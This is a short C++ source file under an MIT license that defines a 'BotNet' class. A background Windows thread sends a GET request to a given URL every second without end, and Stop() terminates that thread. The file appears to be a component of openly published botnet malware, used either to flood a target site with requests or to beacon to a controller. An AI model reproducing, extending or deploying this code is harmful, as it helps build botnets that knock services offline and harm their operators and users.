/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "BotNet.h"
#include "Requests.h"

void BotNet::ThreadNet(LPVOID Param) {
	BotNet* net = (BotNet*)Param;
	while (true) {
		Sleep(1000);
		GetRequest(net->url, "4B4DB4B3");
	}
}

void BotNet::Start(char* url) {
	this->url = url;
	this->hThread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&ThreadNet), (LPVOID)this, 0, 0);
}

void BotNet::Stop() {
	TerminateThread(this->hThread, 0);
}